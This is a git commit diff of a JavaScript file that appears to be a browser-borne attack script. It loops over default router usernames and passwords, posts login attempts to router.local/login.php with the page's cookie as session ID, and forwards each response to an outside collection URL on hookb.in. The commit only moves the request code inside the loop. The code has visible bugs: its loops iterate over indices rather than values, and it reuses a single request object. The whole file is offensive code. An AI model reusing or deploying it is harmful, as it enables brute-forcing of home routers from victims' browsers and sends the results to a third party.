52254fa40c2a8aa32c55a172ad353f9893a4283b
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-05 13:15:21 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,21 +1,23 @@
 const http = new XMLHttpRequest();
-http.open('POST', 'http://router.local/login.php', true);
-http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-http.onload = function () {
-    //if (http.readyState === http.DONE) {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://hookb.in/xYwPmbL69Js0nNxxjZLw', true);
-        xhr.setRequestHeader('Content-type', 'application/json');
-        xhr.send(JSON.stringify(http.responseText));
-        
-     //}
-};
-const cook = document.cookie;
 const pwd = ["secured", "password", "123456", "admin"];
 const username = ["admin","cisco","root"];
 for (p in pwd) {
     for (u in username) {
+        http.open('POST', 'http://router.local/login.php', true);
+        http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        http.onload = function () {
+            //if (http.readyState === http.DONE) {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://hookb.in/xYwPmbL69Js0nNxxjZLw', true);
+                xhr.setRequestHeader('Content-type', 'application/json');
+                xhr.send(JSON.stringify(http.responseText));
+        
+            //}
+        };
+        const cook = document.cookie;
+
+
         http.send("PHPSESSID="+cook+"&username="+u+"&pin="+p+"&notRobot=on");
     }
 }
